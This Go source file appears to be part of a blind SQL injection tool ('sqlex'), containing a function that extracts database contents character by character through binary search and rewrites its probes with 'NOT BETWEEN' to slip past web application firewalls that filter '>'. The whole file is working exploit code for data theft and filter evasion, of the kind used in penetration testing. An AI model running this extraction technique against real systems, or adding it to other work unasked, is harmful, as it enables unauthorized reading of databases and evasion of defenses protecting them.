package extract

import (
	"context"
	"fmt"
	"strings"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/inject"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
)

// betweenSearch uses BETWEEN operator instead of '>' for WAFs that filter '>'.
func betweenSearch(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	pos, lo, hi int,
) (rune, error) {
	for lo <= hi {
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		default:
		}
		mid := (lo + hi) / 2
		probe := payloads.RenderProbe(dataPL, queryable, pos, mid)
		// Replace '={char}' with ' NOT BETWEEN 0 AND {mid}' meaning char > mid
		betweenProbe := strings.Replace(probe,
			fmt.Sprintf("=%d", mid),
			fmt.Sprintf(" NOT BETWEEN 0 AND %d", mid), 1)
		expr := strings.ReplaceAll(
			strings.ReplaceAll(ectx.Vector, "[INFERENCE]", betweenProbe),
			"[SLEEPTIME]", fmt.Sprintf("%d", int(cfg.TimeSec.Seconds())),
		)
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			return 0, err
		}
		if evalHit(ectx, rs, resp, cfg) {
			lo = mid + 1
		} else {
			hi = mid - 1
		}
	}
	if lo < 32 || lo > 127 {
		return ' ', nil
	}
	return rune(lo), nil
}
